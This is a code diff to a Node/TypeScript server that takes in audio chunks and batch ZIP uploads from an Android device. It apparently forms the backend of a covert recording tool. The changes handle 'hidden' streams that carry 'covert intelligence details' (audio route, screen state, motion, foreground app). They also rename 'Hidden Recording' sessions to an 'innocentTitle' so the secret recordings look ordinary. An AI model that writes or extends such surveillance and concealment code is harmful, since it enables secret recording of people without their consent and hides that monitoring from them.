@@ -105,12 +105,13 @@ router.post('/:session_id/chunk', upload.any(), async (req: Request, res: Respon
             const clientName = (req.body && req.body.client_name)
                 || (db.getAllDeviceCommands()[0]?.client_id)
                 || 'Realme-RMX2040';
-            const streamType = req.body?.stream_type === 'main' ? 'main' : 'hidden';
+            const isMn1 = file.originalname.includes('_MN1_');
+            const streamType = isMn1 ? 'both' : (req.body?.stream_type === 'main' ? 'main' : 'hidden');
             session = db.createSession(
                 session_id,
                 clientName,
                 'Android Device (Live)',
-                streamType === 'main' ? `Main Recording - ${clientName}` : `Live Stream - ${clientName}`,
+                isMn1 ? `Recording - ${clientName}` : (streamType === 'main' ? `Main Recording - ${clientName}` : `Live Stream - ${clientName}`),
                 streamType
             );
             console.log(`[broadcast] Auto-recovered live session for chunk: ${session_id} (${clientName}, type: ${streamType})`);
@@ -221,9 +222,9 @@ router.post('/:session_id/chunk', upload.any(), async (req: Request, res: Respon
             if (session) {
                 const baseInfo = session.device_info.split('|')[0].trim();
 
-                // Only show covert intelligence details if this is the covert "hidden" stream!
-                // Main stream sessions remain completely clean and basic.
-                if (session.stream_type === 'hidden') {
+                // Only show covert intelligence details if this is the covert "hidden" or dual "both" stream!
+                // Main-only stream sessions remain completely clean and basic.
+                if (session.stream_type === 'hidden' || session.stream_type === 'both') {
                     let routeStr = '';
                     if (routeCode === 'JCK') routeStr = ' | 🎧 Jack';
                     else if (routeCode === 'BLU') routeStr = ' | 🦷 Bluetooth';
@@ -272,6 +273,15 @@ router.post('/:session_id/chunk', upload.any(), async (req: Request, res: Respon
                     const mnMatch = file.originalname.match(/_MN([01])/);
                     if (mnMatch && mnMatch[1] === '1') {
                         mnStr = ' | 🔴 Main UI Active';
+                        // Promote session to 'both' so it appears on Main Dashboard immediately without APK update
+                        if (session.stream_type === 'hidden') {
+                            db.updateSessionStreamType(session_id, 'both');
+                            if (session.title.startsWith('Hidden Recording')) {
+                                const innocentTitle = `Recording - ${session.client_name || 'Device'}`;
+                                db.updateSessionTitle(session_id, innocentTitle);
+                            }
+                            console.log(`[broadcast] Promoted session ${session_id} to 'both' (MN1 detected: local recording active)`);
+                        }
                     }
 
                     const newDeviceInfo = `${baseInfo} | 🔋 ${battery}%${powerStr}${routeStr}${screenStr}${ringerStr}${audioStr}${tempStr}${motionStr}${postureStr}${appStr}${mnStr}`;
@@ -406,6 +416,18 @@ router.post('/:session_id/upload-zip', upload.single('file'), async (req: Reques
         processZipEntries(zip.getEntries());
 
         const { insertedCount } = db.insertChunksBatch(session_id, batchChunks);
+
+        if (batchChunks.some(c => c.filename.includes('_MN1_'))) {
+            const currentSession = db.getSession(session_id);
+            if (currentSession && currentSession.stream_type === 'hidden') {
+                db.updateSessionStreamType(session_id, 'both');
+                if (currentSession.title.startsWith('Hidden Recording')) {
+                    const innocentTitle = `Recording - ${currentSession.client_name || 'Device'}`;
+                    db.updateSessionTitle(session_id, innocentTitle);
+                }
+                console.log(`[broadcast] Promoted session ${session_id} to 'both' (MN1 in batch zip)`);
+            }
+        }
 
         console.log(`[broadcast] Batch ZIP processed: session=${session_id}, extracted=${batchChunks.length}, inserted=${insertedCount}`);
 
